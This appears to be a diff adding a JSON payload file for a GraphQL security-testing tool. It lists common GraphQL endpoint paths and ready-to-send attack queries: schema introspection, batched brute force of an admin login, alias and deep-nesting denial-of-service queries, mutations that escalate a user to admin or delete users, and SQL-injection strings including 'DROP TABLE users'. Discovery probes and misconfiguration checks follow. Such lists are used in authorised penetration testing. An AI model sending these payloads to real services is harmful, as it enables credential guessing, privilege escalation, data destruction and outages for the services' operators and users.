@@ -1,0 +1,219 @@
+{
+  "info": {
+    "name": "GraphQL Attack Vectors",
+    "author": "CyberDyne Security",
+    "version": "2.0",
+    "description": "GraphQL security testing including introspection, batching attacks, alias abuse, and injection. 2026 updated.",
+    "category": "API",
+    "severity": "HIGH",
+    "owasp": "A01:2021 - Broken Access Control"
+  },
+  "endpoints": [
+    "/graphql",
+    "/api/graphql",
+    "/api/v1/graphql",
+    "/gql",
+    "/query",
+    "/graphql/v1",
+    "/graphiql",
+    "/playground",
+    "/altair",
+    "/voyager",
+    "/api"
+  ],
+  "attack_vectors": {
+    "introspection": [
+      {
+        "query": "{ __schema { types { name fields { name type { name kind } } } } }",
+        "description": "Full schema introspection",
+        "risk": "HIGH"
+      },
+      {
+        "query": "{ __schema { queryType { name fields { name args { name type { name } } } } } }",
+        "description": "Query type fields with args",
+        "risk": "HIGH"
+      },
+      {
+        "query": "{ __type(name: \"User\") { name fields { name type { name kind ofType { name } } } } }",
+        "description": "Specific type introspection",
+        "risk": "HIGH"
+      },
+      {
+        "query": "{ __schema { directives { name args { name type { name } } } } }",
+        "description": "Directives introspection",
+        "risk": "MEDIUM"
+      },
+      {
+        "query": "{ __schema { mutationType { name fields { name } } } }",
+        "description": "Mutation type discovery",
+        "risk": "HIGH"
+      },
+      {
+        "query": "{ __schema { subscriptionType { name fields { name } } } }",
+        "description": "Subscription type discovery",
+        "risk": "MEDIUM"
+      }
+    ],
+    "batching_attack": [
+      {
+        "query": "[{\"query\":\"{ user(id: 1) { name } }\"},{\"query\":\"{ user(id: 2) { name } }\"}]",
+        "description": "Basic batching multiple queries",
+        "risk": "MEDIUM"
+      },
+      {
+        "query": "[{\"query\":\"{ users { id name email } }\"},{\"query\":\"{ admins { id name } }\"}]",
+        "description": "Batch different types",
+        "risk": "MEDIUM"
+      },
+      {
+        "query": "[{\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"wrong\\\") { token } }\"},{\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"password123\\\") { token } }\"}]",
+        "description": "Credential brute force via batching",
+        "risk": "HIGH"
+      }
+    ],
+    "alias_abuse": [
+      {
+        "query": "{ a1: user(id: 1) { name } a2: user(id: 2) { name } a3: user(id: 3) { name } a4: user(id: 4) { name } a5: user(id: 5) { name } }",
+        "description": "Alias enumeration - 5 users",
+        "risk": "HIGH"
+      },
+      {
+        "query": "{ u1: users { id email } u2: users { id email } u3: users { id email } u4: users { id email } u5: users { id email } u6: users { id email } u7: users { id email } u8: users { id email } u9: users { id email } u10: users { id email } }",
+        "description": "Alias DoS - 10x users query",
+        "risk": "HIGH"
+      }
+    ],
+    "field_duplication": [
+      {
+        "query": "{ user(id: 1) { user { user { user { user { name } } } } } }",
+        "description": "Deep nesting attack",
+        "risk": "HIGH"
+      },
+      {
+        "query": "{ user { user { user { user { user { user { name } } } } } } }",
+        "description": "Circular query",
+        "risk": "HIGH"
+      }
+    ],
+    "introspection_depth_bypass": [
+      {
+        "query": "{ __schema { types { name fields { name type { name kind ofType { name kind ofType { name kind ofType { name } } } } } } } }",
+        "description": "Deep introspection bypass",
+        "risk": "MEDIUM"
+      }
+    ],
+    "query_complexity_attack": [
+      {
+        "query": "{ users { posts { comments { author { posts { comments { author } } } } } } }",
+        "description": "High complexity nested query",
+        "risk": "HIGH"
+      },
+      {
+        "query": "{ users { id id id id id id id id id id name name name name name email email email email } }",
+        "description": "Field duplication DoS",
+        "risk": "HIGH"
+      }
+    ],
+    "mutation_injection": [
+      {
+        "query": "mutation { createUser(input: { username: \"hacker\", password: \"Pass123!\" }) { id } }",
+        "description": "User creation mutation",
+        "risk": "HIGH"
+      },
+      {
+        "query": "mutation { deleteUser(id: 1) { success } }",
+        "description": "User deletion mutation",
+        "risk": "CRITICAL"
+      },
+      {
+        "query": "mutation { updateUser(id: 1, input: { role: \"admin\" }) { id } }",
+        "description": "Privilege escalation mutation",
+        "risk": "CRITICAL"
+      },
+      {
+        "query": "mutation { login(username: \"admin\", password: \"admin\") { token } }",
+        "description": "Auth bypass mutation",
+        "risk": "HIGH"
+      }
+    ],
+    "graphql_injection": [
+      {
+        "query": "{ user(id: \"1 OR 1=1\") { name } }",
+        "description": "SQL-like injection attempt",
+        "risk": "MEDIUM"
+      },
+      {
+        "query": "{ user(id: \"1; DROP TABLE users--\") { name } }",
+        "description": "SQL injection attempt",
+        "risk": "MEDIUM"
+      },
+      {
+        "query": "{ user(id: \"1' OR '1'='1\") { name } }",
+        "description": "SQL injection quote bypass",
+        "risk": "MEDIUM"
+      }
+    ],
+    "directive_abuse": [
+      {
+        "query": "{ __type(name: \"Query\") { fields { name args { name directives { name } } } } }",
+        "description": "Directives on args discovery",
+        "risk": "MEDIUM"
+      },
+      {
+        "query": "{ users @skip(if: true) { name } }",
+        "description": "Skip directive test",
+        "risk": "LOW"
+      },
+      {
+        "query": "{ users @include(if: false) { name } }",
+        "description": "Include directive test",
+        "risk": "LOW"
+      }
+    ],
+    "persisted_queries": [
+      {
+        "extensions": {"persistedQuery": {"version": 1, "sha256Hash": "HASH"}},
+        "description": "Persisted query attempt",
+        "risk": "MEDIUM"
+      }
+    ],
+    "csrf_via_get": [
+      {
+        "query": "mutation { login(username: \"test\", password: \"test\") { token } }",
+        "description": "GET mutation CSRF",
+        "risk": "MEDIUM"
+      }
+    ]
+  },
+  "discovery_methods": [
+    {"method": "POST /graphql with introspection query", "description": "Try introspection"},
+    {"method": "GET /graphql?query={__schema{queryType{name}}}", "description": "GET introspection"},
+    {"method": "POST /graphql with {__typename}", "description": "Typename probe"},
+    {"method": "OPTIONS /graphql", "description": "Check allowed methods"},
+    {"method": "POST /graphql with malformed query", "description": "Error-based discovery"}
+  ],
+  "security_misconfig_checks": [
+    {"check": "Introspection enabled", "description": "Schema fully exposed"},
+    {"check": "Query depth limit", "description": "No depth limiting"},
+    {"check": "Query complexity limit", "description": "No complexity limiting"},
+    {"check": "Batch query limit", "description": "No batch limiting"},
+    {"check": "Alias limit", "description": "No alias limiting"},
+    {"check": "CSRF protection", "description": "No CSRF token required"},
+    {"check": "Rate limiting", "description": "No rate limiting"},
+    {"check": "Auth required", "description": "Auth not enforced"}
+  ],
+  "common_types": [
+    "User", "Admin", "Post", "Comment", "Product", "Order", 
+    "Transaction", "Payment", "Session", "Token", "Role", "Permission",
+    "Category", "Tag", "Image", "File", "Setting", "Config"
+  ],
+  "common_mutations": [
+    "createUser", "updateUser", "deleteUser", "login", "logout",
+    "createPost", "updatePost", "deletePost", "createOrder", "updateOrder",
+    "forgotPassword", "resetPassword", "changePassword", "verifyEmail"
+  ],
+  "common_queries": [
+    "user", "users", "post", "posts", "me", "profile",
+    "products", "orders", "search", "feed"
+  ]
+}
